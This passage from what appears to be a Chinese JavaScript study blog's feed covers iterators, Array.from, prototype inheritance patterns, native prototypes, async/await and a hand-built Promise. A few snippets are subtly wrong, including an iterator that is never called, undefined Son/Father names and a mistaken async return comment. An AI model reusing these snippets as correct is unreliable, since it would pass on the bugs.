}}</code></pre><p>既然我们可以定义迭代器，那么，什么时候停止迭代，我们说了算。所以可以把迭代终止条件设为无限</p><h2 id="字符串可迭代"><a href="#字符串可迭代" class="headerlink" title="字符串可迭代"></a>字符串可迭代</h2><p>代码验证：</p><pre><code>Array.prototype.hasOwnProperty(Symbol.iterator)trueString.prototype.hasOwnProperty(Symbol.iterator)true</code></pre><p>因此字符串也可以像数组一样使用 <code>for...of</code></p><pre><code>for (let char of &quot;test&quot;) {    // 触发 4 次，每个字符一次    alert( char ); // t, then e, then s, then t}</code></pre><h2 id="显示调用迭代器方法"><a href="#显示调用迭代器方法" class="headerlink" title="显示调用迭代器方法"></a>显示调用迭代器方法</h2><p>这样做比 for。。。of 更加灵活</p><pre><code>let str = &quot;WORLD&quot;;// 拿到迭代器let iterator = str[Symbol.iterator];while (true) {  let result = iterator.next();  if (result.done) break;  console.log(result.value);}</code></pre><h2 id="类数组对象"><a href="#类数组对象" class="headerlink" title="类数组对象"></a>类数组对象</h2><ul><li>类数组对象指：有索引，有 length 属性的对象</li><li>可迭代对象：实现了 <code>Symbol.iterator</code> 的对象</li></ul><p>确保正确地掌握它们，以免造成混淆</p><p><img src="/images/post-images/1629640685412.png" alt=""></p><p>下面这个对象则是类数组的，但是不可迭代：</p><pre><code>let arrayLike = { // 有索引和 length 属性 =&gt; 类数组对象    0: &quot;Hello&quot;,    1: &quot;World&quot;,    length: 2};// Error (no Symbol.iterator)for (let item of arrayLike) {}</code></pre><h3 id="Array-from😀"><a href="#Array-from😀" class="headerlink" title="Array.from😀"></a>Array.from😀</h3><p>有一个全局方法 <code>Array.from</code> 可以接受一个 ** 可迭代或类数组 ** 的值，并从中获取一个 “真正的” 数组。然后我们就可以对其调用数组方法</p><p>对于上面那个类数组但是不可迭代的对象：</p><pre><code>let arrayLike = {    0: &quot;Hello&quot;,    1: &quot;World&quot;,    length: 2};let arr = Array.from(arrayLike); // (*)alert(arr.pop()); // World（pop 方法有效）</code></pre><p>对于可迭代，但是没有索引，没有 length 属性的对象：</p><pre><code>// 假设 range 来自上文的例子中let arr = Array.from(range);alert(arr); // 1,2,3,4,5 （数组的 toString 转化方法生效）</code></pre><p><code>Array.from</code> 的完整语法允许我们提供一个可选的 “映射（mapping）” 函数</p><pre><code>Array.from(obj, 映射函数, 映射函数的 this 参数)</code></pre><p>例如：</p><pre><code>// 假设 range 来自上文例子中// 求每个数的平方let arr = Array.from(range, num =&gt; num * num);alert(arr); // 1,4,9,16,25</code></pre><p>使用此方法处理字符串，相比使用字符串的 <code>split</code> 方法更方便处理 UTF-16 扩展字符</p><p><img src="/images/post-images/1629640812721.png" alt=""></p><p>使用 Array.from 处理字符串相当于调用字符串的迭代器：</p><pre><code>let str = &#39;😂😂&#39;;let chars = []; // Array.from 内部执行相同的循环for (let char of str) {    chars.push(char);}alert(chars);</code></pre><p>有时，原生方法不支持 UTF16 扩展字符时，可以使用 Array.from</p><pre><code>// 套一个 Array.fromfunction slice(str, start, end) {    return Array.from(str).slice(start, end).join(&#39;&#39;);}let str = &#39;𝒳😂𩷶&#39;;alert( slice(str, 1, 3) ); // 😂𩷶// 原生方法不支持识别代理对（译注：UTF-16 扩展字符）alert( str.slice(1, 3) ); // 乱码（两个不同 UTF-16 扩展字符碎片拼接的结果）</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>可迭代对象必须实现 <code>Symbol.iterator</code> 方法，此方法返回一个迭代器对象，对象包含 next 方法，方法返回 <code>{done: Boolean, value: any}</code> 对<br>象，这里 <code>done:true</code> 表明迭代结束, value 是一个值</li><li><code>Symbol.iterator</code> 方法会被 <code>for..of</code> 自动调用，但我们也可以直接调用它</li><li>内置的可迭代对象例如字符串和数组，都实现了 <code>Symbol.iterator</code></li><li>字符串迭代器可以正确识别 UTF-16 扩展字符😂</li></ul><p>仔细研究一下规范 —— 就会发现大多数内建方法都假设它们需要处理的是可迭代对象或者类数组对象，而不是 “真正的” 数组，因为这样抽象度更高</p>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2048 游戏</title>
      <link href="2021/08/19/2048-you-xi/"/>
      <url>2021/08/19/2048-you-xi/</url>
      
        <content type="html"><![CDATA[<p>自己心血来潮，写的一个 2048。<br>仓库地址：<a href="https://github.com/Anakinliu/2048_Game" target="_blank" rel="noopener">https://github.com/Anakinliu/2048_Game</a><br>在线 Play：/images/game/2048/</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>继承的 6 种实现方式 - 转</title>
      <link href="2021/08/14/ji-cheng-de-6-chong-shi-xian-fang-shi-zhuan/"/>
      <url>2021/08/14/ji-cheng-de-6-chong-shi-xian-fang-shi-zhuan/</url>
      
        <content type="html"><![CDATA[<p>转自 ： <a href="https://github.com/sisterAn/blog/issues/41" target="_blank" rel="noopener">https://github.com/sisterAn/blog/issues/41</a></p><a id="more"></a><h1 id="ES5-继承"><a href="#ES5-继承" class="headerlink" title="ES5 继承"></a>ES5 继承</h1><p>先定义一个父类：</p><pre><code>function SuperType () {  // 属性  this.name = &#39;SuperType&#39;;}// 原型方法SuperType.prototype.sayName = function() {  return this.name;};</code></pre><h2 id="1-原型链继承"><a href="#1-原型链继承" class="headerlink" title="1 原型链继承"></a>1 原型链继承</h2><p>做法：子类的原型直接被赋值为一个父类的实例</p><pre><code>// 父类function SuperType () {  this.name = &#39;SuperType&#39;; // 父类属性}SuperType.prototype.sayName = function () { // 父类原型方法  return this.name;};// 子类function SubType () {  this.subName = &quot;SubType&quot;; // 子类属性};SubType.prototype = new SuperType(); // 重写原型对象，代之以一个新类型的实例// 这里实例化一个 SuperType 时， 实际上执行了两步// 1，新创建的对象复制了父类构造函数内的所有属性及方法// 2，并将原型 __proto__ 指向了父类的原型对象SubType.prototype.saySubName = function () { // 子类原型方法  return this.subName;}// 子类实例let instance = new SubType();// instanceof 通过判断对象的 prototype 链来确定对象是否是某个类的实例instance instanceof SubType; // trueinstance instanceof SuperType; // true// 注意这里SubType instanceof SuperType; // falseSubType.prototype instanceof SuperType ; // true</code></pre><p>优点： 继承了父类的构造函数模板中的属性，又继承了父类的原型对象。<br>子类要新增原型属性和方法，则必须放在 <code>SubType.prototype = new SuperType(&#39;SubType&#39;);</code> 这样的语句之后执行。<br>缺点：</p><ol><li>无法多继承</li><li>父类的所有属性被子类所有实例共享，一个子类实例修改，其他子类属性都可以看到。</li><li>创建子类实例时，无法向父类构造函数传参</li></ol><h2 id="2-构造函数内继承"><a href="#2-构造函数内继承" class="headerlink" title="2 构造函数内继承"></a>2 构造函数内继承</h2><p>做法：在子类型的构造函数内部调用父类型构造函数。<br>没有用到原型。只是把父类的实例属性赋值给子类</p><pre><code>// 父类function SuperType (name) {  this.name = name; // 父类属性}SuperType.prototype.sayName = function () { // 父类原型方法  return this.name;};// 子类function SubType () {  // 调用 SuperType 构造函数  SuperType.call(this, &#39;SuperType&#39;); // 在子类构造函数中，向父类构造函数传参  // 为了保证子父类的构造函数不会重写子类的属性，需要在调用父类构造函数后，定义子类的属性  this.subName = &quot;SubType&quot;; // 子类属性};// 子类实例let instance = new SubType(); // 运行子类构造函数，并在子类构造函数中运行父类构造函数，this 绑定到子类console.log(instance instanceof SuperType); // false, 子类实例并不是父类的实例，只是子类的实例console.log(instance.sayName());  // 报错</code></pre><p>优点：相比直接的原形链继承，解决了：多继承问题，父类传递参数问题，子类实例对象之间共享父类属性问题<br>缺点：</p><ol><li>由于没有使用原型，所以不能继承原型的属性和方法。</li><li>每个子类都有父类实例函数的副本，影响性能</li></ol><h2 id="3-组合继承"><a href="#3-组合继承" class="headerlink" title="3 组合继承"></a>3 组合继承</h2><p>将上面的两个，原型链继承与构造函数继承组合在一起<br>做法：使用原型链继承使用对原型属性和方法的继承，通过构造函数继承来实现对实例属性的继承。这样既能通过在原型上定义方法实现函数复用，又能保证每个实例都有自己的属性。</p><pre><code>// 父类function SuperType (name) {  this.colors = [&quot;red&quot;, &quot;blue&quot;, &quot;green&quot;];  this.name = name; // 父类属性}SuperType.prototype.sayName = function () { // 父类原型方法  return this.name;};// 子类function SubType (name, subName) {  // 调用 SuperType 构造函数  SuperType.call(this, name); // ---- 第二次调用 SuperType----  this.subName = subName;};// ---- 第一次调用 SuperType----SubType.prototype = new SuperType(); // 重写原型对象，代之以一个新类型的实例SubType.prototype.constructor = SubType; // 组合继承需要修复构造函数指向SubType.prototype.saySubName = function () { // 子类原型方法  return this.subName;}// 子类实例let instance = new SubType(&#39;An&#39;, &#39;sisterAn&#39;)instance.colors.push(&#39;black&#39;)console.log(instance.colors) // [&quot;red&quot;, &quot;blue&quot;, &quot;green&quot;, &quot;black&quot;]instance.sayName() // Aninstance.saySubName() // sisterAnlet instance1 = new SubType(&#39;An1&#39;, &#39;sisterAn1&#39;)console.log(instance1.colors) //  [&quot;red&quot;, &quot;blue&quot;, &quot;green&quot;]instance1.sayName() // An1instance1.saySubName() // sisterAn1</code></pre><p><img src="/images/post-images/1628931638492.png" alt=""></p><p><code>SubType.prototype = new SuperType()</code> 这行代码调用父类 SuperType 构造函数时，子类的原型 <code>SubType.prototype</code> 会得到两个属性 <code>name</code> 和 <code>colors</code>；当调用子类 <code>SubType</code> 构造函数时，会第二次调用父类 SuperType 构造函数，这一次又在新对象属性上在再次创建了名为 name 和 colors 的属性，这两个属性就会屏蔽前面子类的原型对象上的同名属性。</p><pre><code>// instanceof：instance 的原型链是针对 SuperType.prototype 进行检查的instance instanceof SuperType // trueinstance instanceof SubType // true// isPrototypeOf：instance 的原型链是针对 SuperType 本身进行检查的SuperType.prototype.isPrototypeOf(instance) // trueSubType.prototype.isPrototypeOf(instance) // true</code></pre><p>优点：可继承原型的属性和方法，也可继承实例属性和方法，不存在属性共享，父类可以传参<br>缺点：调用了两次父类构造函数，虽然够杂子类实例时，将原型上的属性同名属性覆盖</p><h2 id="4-寄生组合继承"><a href="#4-寄生组合继承" class="headerlink" title="4 寄生组合继承"></a>4 寄生组合继承</h2><p>组合继承中，调用了两次父类构造函数，这里 通过通过寄生方式，砍掉父类的实例属性，这样，在调用两次父类的构造的时候，就不会初始化两次实例方法 / 属性，避免的组合继承的缺点。<br>做法：借用 构造函数 继承 属性 ，通过 原型链的混成形式 来继承 方法</p><pre><code>// 父类function SuperType (name) {  this.colors = [&quot;red&quot;, &quot;blue&quot;, &quot;green&quot;];  this.name = name; // 父类属性}SuperType.prototype.sayName = function () { // 父类原型方法  return this.name;};// 子类function SubType (name, subName) {  // 调用 SuperType 构造函数  SuperType.call(this, name); // ---- 第二次调用 SuperType，继承实例属性 ----  this.subName = subName;};// ---- 第一次调用 SuperType，继承原型属性 ----SubType.prototype = Object.create(SuperType.prototype)SubType.prototype.constructor = SubType; // 注意：增强对象let instance = new SubType(&#39;An&#39;, &#39;sisterAn&#39;)console.log(Son.prototype.__proto__ == Father.prototype);  // true</code></pre><p>弥补了组合继承的缺点。注意和组合继承比较一下，子类原型的 <code>[[Prototype]]</code> 是谁</p><h1 id="ES6-继承"><a href="#ES6-继承" class="headerlink" title="ES6 继承"></a>ES6 继承</h1><pre><code>class People {    constructor(name) {        this.name = name    }    run() { }}// extends 相当于方法的继承// 替换了上面的 3 行代码class Man extends People {    constructor(name) {        // super 相当于属性的继承        // 替换了 People.call(this, name)        super(name)        this.gender = &#39;男&#39;    }    fight() { }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>类 - 你不知道的 JS</title>
      <link href="2021/08/14/lei-ni-bu-zhi-dao-de-js/"/>
      <url>2021/08/14/lei-ni-bu-zhi-dao-de-js/</url>
      
        <content type="html"><![CDATA[<p>未完待续</p><a id="more"></a><h1 id="class-语法"><a href="#class-语法" class="headerlink" title="class 语法"></a>class 语法</h1><pre><code>class MyClass {    // class 方法    constructor() { ... }    method1() { ... }    method2() { ... }    method3() { ... }    ...}</code></pre><p>然后使用 <code>new MyClass()</code> 来创建具有上述列出的所有方法的新对象。</p>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>原型 &amp; 继承三 - 你不知道的 JS</title>
      <link href="2021/08/13/yuan-xing-andji-cheng-san/"/>
      <url>2021/08/13/yuan-xing-andji-cheng-san/</url>
      
        <content type="html"><![CDATA[<p>原生原型</p><a id="more"></a><h2 id="Object-prototype"><a href="#Object-prototype" class="headerlink" title="Object.prototype"></a>Object.prototype</h2><pre><code>let obj = {};obj.toString(); // &quot;[object Object]&quot; ?</code></pre><p><code>toString</code> 方法是内建的 ，但是它到底在哪里呢？ obj 是空的！</p><ol><li>表达式 <code>obj = {}</code> 和 <code>obj = new Object()</code> 是一个意思</li><li>Object 是内建的对象构造函数，其 prototype 指向一个巨大对象，这个巨大对象包含 toString 和其他很多方法</li></ol><p><img src="/images/post-images/1628857974976.png" alt=""></p><p>当 <code>new Object</code> 调用执行（或者创建字面量对象），这个被创建的对象的 <code>[[Prototype]]</code> 属性就被设置为 <code>Object.prototype</code></p><p><img src="/images/post-images/1628858082348.png" alt=""></p><p>所以，一开始的代码的 <code>obj.toString();</code> 就是从 <code>Object.prototype</code> 中获取的。</p><pre><code>let obj = {};alert(obj.__proto__ === Object.prototype); // truealert(obj.toString === obj.__proto__.toString); //truealert(obj.toString === Object.prototype.toString); //true</code></pre><blockquote><p>Object.prototype 上方的链中没有更多的 <code>[[Prototype]]</code>，所以 <code>Object.prototype.__proto__</code> 指向 <code>null</code></p></blockquote><h2 id="其他的内建的原型"><a href="#其他的内建的原型" class="headerlink" title="其他的内建的原型"></a>其他的内建的原型</h2><p>Date，Array，Function，String，Number 等，都在各自的 <code>prototy[e</code> 表示的巨大对象上挂载了大量方法。</p><p>例如，当我们创建一个数组 <code>[1, 2, 3]</code>，在内部会默认使用 <code>new Array()</code> 构造器。因此 <code>Array.prototype</code> 变成了这个数组的 <code>prototype</code>，并为这个数组提供数组的操作方法。这样内存的存储效率是很高的。</p><p>按照规范，所有的内建原型顶端都是 <code>Object.prototype</code> 。这就是为什么有人说 “一切都从对象<br>继承而来”。</p><p>完整的示意图</p><p><img src="/images/post-images/1628858379792.png" alt=""></p><p>代码验证：</p><pre><code>let arr = [1, 2, 3];// 它继承自 Array.prototypealert( arr.__proto__ === Array.prototype ); // true// 接下来继承自 Object.prototypealert( arr.__proto__.__proto__ === Object.prototype ); // true// 原型链的顶端为 null。alert( arr.__proto__.__proto__.__proto__ ); // null</code></pre><p>很多方法在原型上可能会发生重叠，例如， Array.prototype 有自己的 toString 方法来列举出来数组的所有元素并用逗号分隔每一个元素。Object.prototype 也有 toString 方法，但是 Array.prototype 在原型链上更近（最先被找到），所以数组对象原型上的方法会被使用。</p><p>函数都是内建构造器 Function 的对象，并且它们的方法（call，apply 等）都取自 <code>Function.prototype</code></p><h2 id="更改原生原型"><a href="#更改原生原型" class="headerlink" title="更改原生原型"></a>更改原生原型</h2><p>原型是全局的，所以很容易造成冲突。<br>通常来说，修改原生原型被认为是一个很不好的想法。</p><p>只有一种情况下允许修改原生原型。那就是 <strong>polyfilling</strong></p><p>Polyfilling 是一个术语，表示某个方法在 *<em>JavaScript 规范中已存在，但是特定的 JavaScript 引擎尚不支持该方法 *</em>，那么我们可以通过手动实现它，并用以填充内建原型</p><pre><code>if (!String.prototype.repeat) { // 如果这儿没有这个方法// 那就在 prototype 中添加它String.prototype.repeat = function(n) {// 重复传入的字符串 n 次// 实际上，实现代码比这个要复杂一些（完整的方法可以在规范中找到）// 但即使是不够完美的 polyfill 也常常被认为是足够好的return new Array(n + 1).join(this);};}alert( &quot;La&quot;.repeat(3) ); // LaLaLa</code></pre><h2 id="从原型中借用"><a href="#从原型中借用" class="headerlink" title="从原型中借用"></a>从原型中借用</h2><p>一些原生原型的方法通常会被借用。<br>例如，如果我们要创建类数组对象，则可能需要向其中复制一些 Array 方法。</p><pre><code>let obj = {    0: &quot;Hello&quot;,    1: &quot;world!&quot;,    length: 2,};obj.join = Array.prototype.join;alert( obj.join(&#39;,&#39;) ); // Hello,world!</code></pre><p>上面这段代码有效，是因为内建的方法 join 的内部算法只关心正确的索引和 length 属性。它<br>不会检查这个对象是否是真正的数组。许多内建方法就是这样。</p><p>另一种方式是通过继承，就是将 <code>obj.__proto__</code> 设置为 <code>Array.prototype</code> ，这样 Array 中的所有方法都自动地可以在 obj 中使用了。</p><blockquote><p>方法借用很灵活，它允许在需要时混合来自不同对象的方法。</p></blockquote><h2 id="不要使用-proto"><a href="#不要使用-proto" class="headerlink" title="不要使用 __proto__"></a>不要使用 <code>__proto__</code></h2><p>现代的方法有:</p><ol><li><code>Object.create()</code> 方法创建一个新对象，使用现有的对象作为新创建的对象的 <code>__proto__</code></li><li><code>Object.getPrototypeOf(obj)</code> 返回对象 obj 的 <code>[[Prototype]]</code>。</li><li><code>Object.setPrototypeOf(obj, proto)</code> 将参数 obj 的 <code>[[Prototype]]</code> 设置为参数 <code>proto</code>。</li></ol><blockquote><p>如果速度很重要，就请不要修改已存在的对象的 <code>[[Prototype]]</code></p></blockquote><h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><h2 id="proto不是-prototype-本身"><a href="#proto不是-prototype-本身" class="headerlink" title="proto不是 [[prototype]] 本身"></a><strong>proto</strong>不是 <code>[[prototype]]</code> 本身</h2><p><code>__proto__</code> 不是一个对象的属性，只是 <code>Object.prototype</code> 的访问器属性</p><p><img src="/images/post-images/1628859778698.png" alt=""></p><p><img src="/images/post-images/1628859790434.png" alt=""></p><p>因此，如果 <code>obj.__proto__</code> 被读取或者赋值，那么对应的 getter/setter 会被从它的原型中调<br>用，它会 set/get [[Prototype]] 。<br>就像在本部分教程的开头所说的那样： <code>__proto__</code> 是一种访问 <code>[[Prototype]]</code> 的方式，而<br>不是 <code>[[prototype]]</code> 本身!!!</p><h2 id="纯对象，纯字典"><a href="#纯对象，纯字典" class="headerlink" title="纯对象，纯字典"></a>纯对象，纯字典</h2><p><code>Object.create(null)</code> 创建了一个空对象，这个对象没有原型，因为 <code>[[Prototype]]</code> 是 <code>null</code>.<br><img src="/images/post-images/1628859943894.png" alt=""></p><p>因此，它没有继承 <code>__proto__</code> 的 <code>getter/setter</code> 方法。<br>一般的对象的 <code>__proto__</code> 是不能被设置为对象的键。但是纯对象可以使用这个键。</p><pre><code>&gt; let j1 = {}undefined&gt; j1[&quot;__proto__&quot;] = 66&gt; j1[&quot;__proto__&quot;]{}&gt; let j2 = Object.create(null);undefined&gt; j2[&quot;__proto__&quot;] = 9;9&gt; j2[&quot;__proto__&quot;]9</code></pre>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>async 与 await - 你不知道的 JS</title>
      <link href="2021/08/13/async-yu-await-ni-bu-zhi-dao-de-js/"/>
      <url>2021/08/13/async-yu-await-ni-bu-zhi-dao-de-js/</url>
      
        <content type="html"><![CDATA[<p>Async/await 是以更舒适的方式使用 promise 的一种特殊语法，同时它也非常易于理解和使用。</p><a id="more"></a><h2 id="asyuc-的函数"><a href="#asyuc-的函数" class="headerlink" title="asyuc 的函数"></a>asyuc 的函数</h2><p>async 关键字，要放在函数前面：</p><pre><code class="javascript">async function f1() {    return 1;    // return Promise.resolve(1);}async function f2() {    return}async function f3() {    return new Promise((resolve, rekected) =&gt; {        resolve(&quot;OK&quot;);    });}console.log(f1()); // Promise { 1 }console.log(f2());// undefinedconsole.log(f3());  //Promise { &lt;pending&gt; }</code></pre><p>“async” 这个单词表达了一个简单的事情：函数总是返回一个 promise。<br>显式返回的非 promise 值将自动被包装在一个 resolved 的 promise 中。</p><h2 id="await"><a href="#await" class="headerlink" title="await"></a>await</h2><p>关键字 <code>await</code> 让 JavaScript 引擎等待直到 <code>promise</code> 完成（settle）并返回结果。</p><blockquote><p>在非 <code>async</code> 函数中使用 <code>await</code> 的话，就会报语法错误</p></blockquote><pre><code class="javascript">// async 函数内let value = await a promise;</code></pre><p>下面的代码执行到 <code>let result = await promise</code>，等待 promise 执行完 resolve 后，才会继续向下执行 alert。</p><pre><code class="javascript">async function f() {    let promise = new Promise((resolve, reject) =&gt; {    setTimeout(() =&gt; resolve(&quot;done!&quot;), 1000)    });    let result = await promise; // 等待，直到 promise resolve (*)    alert(result); // &quot;done!&quot;}f();</code></pre><blockquote><p>暂停 async 函数执行时，JavaScript 引擎会转去吃力其他脚本代码任务。</p></blockquote><p>相比多个 then 的链式调用，使用 await 的写法看上去更优雅。<br>使用 await 可以做到 Python 里 sleep 函数那种效果，阻塞代码执行一定时间</p><pre><code class="javascript">(async (time) =&gt; {    console.log(1);    await new Promise((resolve, reject) =&gt; {        setTimeout(resolve, time);    })    console.log(2);  //3s 后打印 2})(3000);</code></pre><p>包裹匿名函数，是因为 await 不能直接用在顶层代码中。</p><h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h2><p>如果一个 <code>promise</code> 正常 <code>resolve</code>， <code>await promise</code> 返回的就是其结果。但是如果 promise 被 <code>reject</code>，它将 <code>throw</code> 这个 <code>error</code>，就像在这一行有一个 <code>throw</code> 语句那样。</p><pre><code class="javascript">async function f() {    await Promise.reject(new Error(&quot;Whoops!&quot;));}</code></pre><p>等同于：</p><pre><code class="javascript">async function f() {    throw new Error(&quot;Whoops!&quot;);}</code></pre><p>这个 Error 可以使用 <code>try...catch</code> 进行捕获，就像捕获常规的 throw 抛出的错误。<br>可以用 try 包装多行 <code>await</code> 代码，一旦有任一 <code>error</code>，执行控制权马上移交 <code>catch</code> 块:<br>如果我们没有 <code>try..catch</code> 块，那么由异步函数 <code>f()</code> 的调用生成的 <code>promise</code> 将变为 <code>rejected</code>。<br>我们可以在函数调用后面添加 <code>.catch</code> 来处理这个 error</p><pre><code class="javascript">async function f() {    let response = await fetch(&#39;http://no-such-url&#39;);}// f() 变成了一个 rejected 的 promisef().catch(alert); // TypeError: failed to fetch // (*)</code></pre><p>如果我们忘了在这添加 .catch ，那么我们就会得到一个未处理的 promise error（可以在控制台中查看）。我们可以使用在 使用 promise 进行错误处理 一章中所讲的全局事件处理程序 unhandledrejection 来捕获这类 error</p>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实现 Promise - 翻译</title>
      <link href="2021/08/13/shi-xian-promise-fan-yi/"/>
      <url>2021/08/13/shi-xian-promise-fan-yi/</url>
      
        <content type="html"><![CDATA[<p>更好地理解 Promise</p><a id="more"></a><p><a href="https://www.promisejs.org/implementing/" target="_blank" rel="noopener">英文原文链接</a></p><h1 id="状态机"><a href="#状态机" class="headerlink" title="状态机"></a>状态机</h1><p>由于 promise 只是一个状态机，我们应该首先引入我们后面需要的状态信息。</p><pre><code class="javascript">var PENDING = 0;var FULFILLED = 1;var REJECTED = 2;function Promise() {  // 状态可以是 PENDING, FULFILLED or REJECTED  let state = PENDING;  // 在状态变为 FULFILLED or REJECTED 后，存储 value 或者 error   let value = null;  // 通过调用 .then 或者 .done，存储成功或失败的 handlers   var handlers = [];}</code></pre><h1 id="状态转变"><a href="#状态转变" class="headerlink" title="状态转变"></a>状态转变</h1><pre><code class="javascript">var PENDING = 0;var FULFILLED = 1;var REJECTED = 2;function Promise() {  // 状态可以是 PENDING, FULFILLED or REJECTED  let state = PENDING;  // 在状态变为 FULFILLED or REJECTED 后，存储 value 或者 error   let value = null;  // 通过调用 .then 或者 .done，存储成功或失败的 handlers   var handlers = [];  function fulfill(result) {    state = FULFILLED;    value = result;  }  function reject(error) {    state = REJECTED;    value = error;  }}</code></pre><p>这为我们提供了基本的低级转换，但让我们考虑一个额外的、更高级别的转换，resolve</p><pre><code class="javascript">var PENDING = 0;var FULFILLED = 1;var REJECTED = 2;function Promise() {  // store state which can be PENDING, FULFILLED or REJECTED  var state = PENDING;  // store value once FULFILLED or REJECTED  var value = null;  // store sucess &amp; failure handlers  var handlers = [];  function fulfill(result) {    state = FULFILLED;    value = result;  }  function reject(error) {    state = REJECTED;    value = error;  }  function resolve(result) {    try {      let then = getThen(result);      if (then) {        doResolve(then.bind(result), resolve, reject)        return      }      // then 是 null 时调用 fulfill，即 result 是纯值时调用      fulfill(result);    } catch (e) {      reject(e);    }  }}</code></pre><p>注意，resolve 函数接收一个 promise 对象或者其他非 promise 对象。接收 promise 对象时，会等待此对象完成状态转换。<br>一个 promise 是不能通过另一个 promise 完成状态转换到 fulfilled，此时我们将暴露的是这个 resolve 函数，而不是内部的 fulfill 函数，我们使用了辅助方法：</p><ul><li>getThen 方法<pre><code class="javascript">/*** 检查 value 是否是 Promise ，如果是, 返回 value.then.** @param Promise 或其他任何值* @return 函数或者 null*/function getThen(value) {var t = typeof value;if (value &amp;&amp; (t === &#39;object&#39; || t === &#39;function&#39;)) {  var then = value.then;  if (typeof then === &#39;function&#39;) {    return then;  }}return null;}</code></pre></li><li>doResolve 方法<pre><code class="javascript">/*** 接收一个潜在的错误行为的 resolver 函数，并确保 onFulfilled 和 onRejected 只会被调用一次** 此方法没有异步安全性** @param {Function} fn ： 一个 resolver 函数，可能不可信的* @param {Function} 函数 onFulfilled* @param {Function} 函数 onRejected*/function doResolve(fn, onFulfilled, onRejected) {var done = false;try {  fn(function (value) {    if (done) return    done = true    onFulfilled(value)  }, function (reason) {    if (done) return    done = true    onRejected(reason)  })  // fn 函数执行结束} catch (ex) {  if (done) return  done = true  onRejected(ex)}}</code></pre><h1 id="搭建-Promise"><a href="#搭建-Promise" class="headerlink" title="搭建 Promise"></a>搭建 Promise</h1></li></ul><pre><code class="javascript">var PENDING = 0;var FULFILLED = 1;var REJECTED = 2;function Promise(fn) {  // store state which can be PENDING, FULFILLED or REJECTED  var state = PENDING;  // store value once FULFILLED or REJECTED  var value = null;  // store sucess &amp; failure handlers  var handlers = [];  function fulfill(result) {    state = FULFILLED;    value = result;  }  function reject(error) {    state = REJECTED;    value = error;  }  function resolve(result) {    try {      var then = getThen(result);      if (then) {        doResolve(then.bind(result), resolve, reject)        return      }      fulfill(result);    } catch (e) {      reject(e);    }  }  doResolve(fn, resolve, reject);}</code></pre><p>我们多次使用 <code>doResolve</code>，因为我们有多个不可信任的 resolver。<code>fn</code> 被允许多次调用 <code>resolve</code> 和 <code>reject</code>，即使抛出了异常。我们有责任确保承诺只变为 resolved 或 rejected 一次，然后永远不会再转换到不同的状态。</p><h1 id="观察"><a href="#观察" class="headerlink" title="观察"></a>观察</h1><p>状态机已经完整了，但是我们不能观察或者改变状态机，我们的究极目标是实现 <code>.then</code> 方法，但是这里先实现一个比 <code>.then</code> 简单地 <code>.done</code> 方法。<br>此 <code>.done(onFulfilled, onRejected)</code> 方法：</p><ol><li>只会被 <code>onFulfilled</code> 或者 <code>onRejected</code> 调用</li><li>只会被调用一次</li><li>直到下一个滴答声（即在 <code>.done</code> 方法返回之后）才会被调用</li><li>无论 rpomsie 在我们调用 <code>.done</code> 之前还是之后 resolved 了，<code>.done</code> 都会被调用</li></ol><pre><code class="javascript">var PENDING = 0;var FULFILLED = 1;var REJECTED = 2;function Promise(fn) {  // store state which can be PENDING, FULFILLED or REJECTED  var state = PENDING;  // store value once FULFILLED or REJECTED  var value = null;  // store sucess &amp; failure handlers  var handlers = [];  function fulfill(result) {    state = FULFILLED;    value = result;  }  function reject(error) {    state = REJECTED;    value = error;  }  function resolve(result) {    try {      var then = getThen(result);      if (then) {        doResolve(then.bind(result), resolve, reject)        return      }      fulfill(result);    } catch (e) {      reject(e);    }  }function handle(handler) {    if (state === PENDING) {      handlers.push(handler);    } else {      if (state === FULFILLED &amp;&amp;        typeof handler.onFulfilled === &#39;function&#39;) {        handler.onFulfilled(value);      }      if (state === REJECTED &amp;&amp;        typeof handler.onRejected === &#39;function&#39;) {        handler.onRejected(value);      }    }  }  this.done = function (onFulfilled, onRejected) {    // ensure we are always asynchronous    setTimeout(function () {      handle({        onFulfilled: onFulfilled,        onRejected: onRejected      });    }, 0);  }   doResolve(fn, resolve, reject);}</code></pre><h1 id="实现-then"><a href="#实现-then" class="headerlink" title="实现. then"></a>实现. then</h1><p>then 需要返回一个 Promise 对象</p><pre><code class="javascript">this.then = function (onFulfilled, onRejected) {  var self = this;  return new Promise(function (resolve, reject) {    return self.done(function (result) {      if (typeof onFulfilled === &#39;function&#39;) {        try {          return resolve(onFulfilled(result));        } catch (ex) {          return reject(ex);        }      } else {        return resolve(result);      }    }, function (error) {      if (typeof onRejected === &#39;function&#39;) {        try {          return resolve(onRejected(error));        } catch (ex) {          return reject(ex);        }      } else {        return reject(error);      }    });  });}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对象 - 你不知道的 JS</title>
      <link href="2021/08/12/dui-xiang-ni-bu-zhi-dao-de-js/"/>
      <url>2021/08/12/dui-xiang-ni-bu-zhi-dao-de-js/</url>
      
